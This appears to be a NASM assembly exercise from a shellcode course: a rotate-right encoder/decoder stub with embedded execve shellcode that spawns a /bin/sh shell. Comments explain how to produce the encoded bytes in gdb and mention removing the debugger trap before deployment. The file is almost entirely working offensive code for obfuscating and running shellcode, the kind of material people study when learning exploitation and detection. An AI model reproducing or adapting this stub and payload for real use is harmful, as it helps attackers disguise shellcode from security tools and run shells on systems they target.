; Filename: ror.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com/
;
; Purpose:
;	Provide two way ror encoding of shellcode bytes.
;
; Strictly speaking, this is both the encoder and decoder
; stubs. Patch in your clean shellcode, compile the file
; get-sh.sh the result and drop it into a -ggdb compiled
; shellcode tester. When you run gdb and hit the
; shellcode defined int 0x03 (character \xcc in the shell
; output), type:
;
; x/21xb $esi
;
; 21 here being the length of my execve() shellcode, your
; shellcode length will vary.
;
; The resulting bytes are your encoded shellcode. Add them
; to the bottom of the stub and it will encode them just
; as easily.
;
; Notes:
;	Live use of this code for decoding will want to
;	remove the \xcc before deployment.
;

global _start
section .text
_start:
	jmp short caller

encoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov cl, codelen

encode:
	mov bl, byte [esi + eax]	; Retrieve current byte of shellcode
	ror bl, 4			; Encode/ Decode it
	mov byte [edi], bl		; Put it back where it belongs

	inc edi				; Move to the next byte
	inc eax

	dec ecx				; Count down, make sure that we have
	jnz encode			; or have not reached the end of our
					; shellcode

	int 0x03			; debugger interrupt. We do not want
					; to jmp to shellcode during encode
					; so we enter this int to stop gdb
					; and let us dump ESI for our encoded
					; shellcode

	jmp short shellcode

caller:
	call encoder

	shellcode: db 0x31,0xc9,0xf7,0xe1,0x50,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0xb0,0x0b,0xcd,0x80
	codelen equ $-shellcode
